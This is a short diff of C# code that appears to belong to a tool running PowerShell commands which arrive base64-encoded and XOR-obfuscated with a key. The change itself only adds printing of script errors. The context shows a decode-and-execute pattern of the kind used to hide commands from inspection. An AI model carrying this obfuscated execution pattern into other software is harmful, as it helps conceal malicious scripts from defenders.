@@ -33,15 +33,17 @@
 					p.AddScript(System.Text.Encoding.UTF8.GetString(Zor(Convert.FromBase64String(cmnd), Encoding.UTF8.GetBytes(key))));
 					Collection<PSObject> output = null;
 					output = p.Invoke();
-
-					try
-					{
-						foreach (PSObject rtnItem in output)
-						{
-							Console.WriteLine(rtnItem.ToString());
-						}
+					
+					if(p.Streams.Error.Count != 0) {
+						Console.WriteLine("Error in script:\n");
 					}
-					catch(Exception e){}
+					foreach(ErrorRecord e in p.Streams.Error) {
+						Console.WriteLine(e.ToString());
+					}
+					foreach(PSObject rtnItem in output)
+					{
+						Console.WriteLine(rtnItem.ToString());
+					}
 					return true;
 				}
 				private static byte[] Zor(byte[] input, byte[] key)
